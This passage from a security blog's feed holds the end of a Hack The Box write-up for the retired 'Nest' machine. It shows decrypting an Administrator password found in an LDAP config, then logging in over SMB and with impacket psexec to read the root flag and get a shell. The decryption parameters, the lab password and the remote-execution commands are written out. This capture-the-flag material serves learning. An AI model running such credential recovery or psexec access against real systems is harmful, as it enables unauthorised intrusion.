+&lt;span class="code-line"&gt;QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[1]   HqkLdap.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;[2]   Ldap.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Directory: ldap&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;showquery 2&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Domain=nest.local&lt;/span&gt;
+&lt;span class="code-line"&gt;Port=389&lt;/span&gt;
+&lt;span class="code-line"&gt;BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;User=Administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="reversing-hqkldapexe"&gt;"Reversing" HqkLdap.exe&lt;/h2&gt;
+&lt;p&gt;We download the latest release of &lt;a href="https://github.com/0xd4d/dnSpy"&gt;dnSpy&lt;/a&gt; and
+load the binary. We quickly find some encryption and decryption functions. They
+are similar to the ones in the Utils.vb but use different parameters
+(passphrase, salt, number of password iteration, initialisation vector and key
+size).&lt;/p&gt;
+&lt;p&gt;&lt;a href="/media/2020.06/nest_01.png"&gt;dnSpy&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We change the values in our previous module in MS Visual Basic 2010 Express and
+rerun the code. The only changed line is the following:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This give us the administrator password: XtH4nkS4Pl4y1nGX.&lt;/p&gt;
+&lt;p&gt;We connect to the "C$" share as administrator and are able to get the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/C$ -U &amp;quot;Administrator&amp;quot;%&amp;quot;XtH4nkS4Pl4y1nGX&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commads.&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \&amp;gt; cd Users\Administrator\&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \Users\Administrator\&amp;gt; cd Desktop\&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \Users\Administrator\Desktop\&amp;gt; ls&lt;/span&gt;
+&lt;span class="code-line"&gt;  .                                  DR        0  Sun Jan 26 02:20:50 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;  ..                                 DR        0  Sun Jan 26 02:20:50 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;  root.txt                            A       32  Mon Aug  5 18:27:26 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                10485247 blocks of size 4096. 6449582 blocks available&lt;/span&gt;
+&lt;span class="code-line"&gt;smb: \Users\Administrator\Desktop\&amp;gt; mget root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Get file root.txt? y&lt;/span&gt;
+&lt;span class="code-line"&gt;getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)n&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can also use psexec to directly execute commands on the system as
+administrator.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.178.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Uploading file xHADOhNA.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.178.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating service OtZQ on 10.10.10.178.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Starting service OtZQ.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 6.1.7601]&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;cd ../..&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\&amp;gt;cd Users\Administrator\Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;6594c2eb084bc0f08a42f0b94b878c41&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was interesting but a bit ctfish. I learn a few things about NTFS
+alternate data stream and how to get them from a GNU/Linux box.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="VB"></category><category term=".NET"></category><category term="RE"></category><category term="SMB"></category><category term="Windows"></category></entry><entry><title>HTB: Resolute</title><link href="https://maggick.fr/2020/05/htb-resolute.html" rel="alternate"></link><published>2020-05-31T10:45:00+02:00</published><updated>2020-05-31T10:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-31:/2020/05/htb-resolute.html</id><summary type="html">&lt;p&gt;&lt;img alt="Resolute Card" class="align-left" src="/media/2020.05/resolute_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/220"&gt;Resolute&lt;/a&gt;.
 This box was created by
